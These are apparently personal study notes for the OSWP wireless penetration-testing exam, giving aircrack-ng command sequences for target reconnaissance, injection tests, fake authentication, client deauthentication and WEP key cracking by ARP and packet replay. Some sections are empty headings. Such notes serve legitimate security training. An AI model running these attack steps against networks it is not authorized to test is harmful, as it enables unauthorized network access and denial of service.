OSWP Notes

================================================================================================================================
====================     ___          __             ____         _    _                  _                  ===================
====================    |_ _| _ __   / _|  ___      / ___|  __ _ | |_ | |__    ___  _ __ (_) _ __    __ _    ===================
====================     | | | '_ \ | |_  / _ \    | |  _  / _` || __|| '_ \  / _ \| '__|| || '_ \  / _` |   ===================
====================     | | | | | ||  _|| (_) |   | |_| || (_| || |_ | | | ||  __/| |   | || | | || (_| |   ===================
====================    |___||_| |_||_|   \___/     \____| \__,_| \__||_| |_| \___||_|   |_||_| |_| \__, |   ===================
====================                                                                                |___/    ===================
================================================================================================================================

Identify Target + Gather Info
----------------------------------------------------------------
  1) airmon-ng check kill 
  2) airmon-ng start <INT> 
  3) airodump-ng <INT>
      Find target's:
        A) ESSID + BSSID
        B) ENC, CIPHER, AUTH
        C) Channel 
  4) airmon-ng stop <INT>
  5) airmon-ng start <INT> <CHANNEL> 
  6) airodump-ng -c <CHANNEL> --bssid <BSSID> <INT>  ---- DONT CLOSE THIS YET 
      Check for clients on network 
  7) aireplay-ng -1 0 -e <ESSID> -a <BSSID> <INT>  ---- Look at "no source MAC" message to get MAC
  8) aireplay-ng -1 0 -e <ESSID> -a <BSSID> <INT> -h <MY MAC>
      Look at airodump output to see AUTH (OPN/SKA for WEP)
  
  
Injection Test
----------------------------------------------------------------
  1) aireplay-ng -9 -e <ESSID> -a <BSSID> <INT>


Fake Authentication Attack
----------------------------------------------------------------
  1) aireplay-ng -1 0 -e <ESSID> -a <BSSID> <INT>  ---- Look at "no source MAC" message to get MAC
  2) aireplay-ng -1 0 -e <ESSID> -a <BSSID> <INT> -h <MY MAC>
or 
  1) aireplay-ng -1 6000 -e <ESSID> -b <BSSID> -h <MY MAC> <INT>   ---- Repeats fake auth
  

Deauthentication/Disassociation Attack
----------------------------------------------------------------
  1) aireplay-ng -0 1 -a <BSSID> -c <MAC TO KICK> <INT>  ---- Make sure to supply specific MAC. Works better. 



================================================================================================================================
==============================================   __        __ _____  ____     ==================================================
==============================================   \ \      / /| ____||  _ \    ==================================================
==============================================    \ \ /\ / / |  _|  | |_) |   ==================================================
==============================================     \ V  V /  | |___ |  __/    ==================================================
==============================================      \_/\_/   |_____||_|       ==================================================
================================================================================================================================
        
Ways to get WEP Key
----------------------------------------------------------------
[+]  I) Client (WEP / OPN)
     [+]  A) ARP Request Replay
              1) Open 3 windows
              2) aireplay-ng -1 0 -e <ESSID> -a <BSSID> <INT> -h <MY MAC>  ---- Fake authentication attack
              3) {Window 1} airodump-ng -c <CHANNEL> --essid <ESSID> -w <OUTPUT_FILE> <INT>  ---- Capture traffic 
              4) {Window 2} aireplay-ng -3 -b <BSSID> -h <CLIENT_MAC> <INT>  ---- Sniff for ARP traffic from client
              5) aireplay-ng -0 1 -a <BSSID> -c <MAC TO KICK> <INT>  ---- Disassociate client
              6) Wait for client to reassociate
              7) Look at #Data in Airodump capture, wait for #Data to reach ~150k before stopping 
              8) aircrack-ng -z <OUTPUT_FILE.cap>  ---- Crack key with PTW 
            
     [+]  B) Natural Packet Replay
              1) Open 3 windows
              2) aireplay-ng -1 0 -e <ESSID> -a <BSSID> <INT> -h <MY MAC>  ---- Fake authentication attack
              3) {Window 1} airodump-ng -c <CHANNEL> --essid <ESSID> -w <OUTPUT_FILE> <INT>  ---- Capture traffic 
              4) {Window 2} aireplay-ng -2 -b <BSSID> -d FF:FF:FF:FF:FF:FF -t 1 <INT>  ---- Await a packet going to broadcast MAC
              5) Wait for client to make a request, a packet will appear in aireplay window 
     
     [+]  C) Modified Packet Replay
      
[+]  II) Clientless (WEP / OPN)
     [+]  A) Fragmenation Attack
     [+]  B) ChopChop

[+]  III) Client (WEP / SKA) 
     [+]  A) PRGA XOR Capture
     [+]  B) Rogue AP
     




================================================================================================================================
=============================    __        __ ____    _         __ __        __ ____    _     ____     =========================
=============================    \ \      / /|  _ \  / \       / / \ \      / /|  _ \  / \   |___ \    =========================
=============================     \ \ /\ / / | |_) |/ _ \     / /   \ \ /\ / / | |_) |/ _ \    __) |   =========================
=============================      \ V  V /  |  __// ___ \   / /     \ V  V /  |  __// ___ \  / __/    =========================
=============================       \_/\_/   |_|  /_/   \_\ /_/       \_/\_/   |_|  /_/   \_\|_____|   =========================
================================================================================================================================
                                                                    
Ways to get WPA/WPA2 Key
----------------------------------------------------------------
    1) Capture 4-way Handshake 
